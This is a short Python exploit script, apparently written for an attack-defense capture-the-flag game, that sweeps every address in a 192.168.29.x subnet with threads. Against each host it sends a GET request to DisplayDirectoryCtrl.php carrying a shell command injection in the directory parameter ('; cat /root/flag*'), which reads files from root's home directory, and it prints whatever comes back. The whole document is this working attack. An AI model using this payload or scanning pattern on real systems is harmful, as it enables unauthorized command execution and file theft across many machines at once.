import http.client
import sys
import threading

def insert(host):
	ur="/DisplayDirectoryCtrl.php?directory=/var/www%20;%20cat%20/root/flag*"
	try:
		
		c=http.client.HTTPConnection(host)

		c.request(method="GET",url=ur)
		response=c.getresponse()
		r=response.read()
		print(r)
		print(host)
		c.close()
	except Exception as e:
		sys.exit()
if __name__ == "__main__":
	a=1
	while a<=254:
		host='192.168.29.'+str(a)
		if host !='192.168.29.12':
			t=threading.Thread(target=insert,args=(host,))
			t.start()
		a=a+1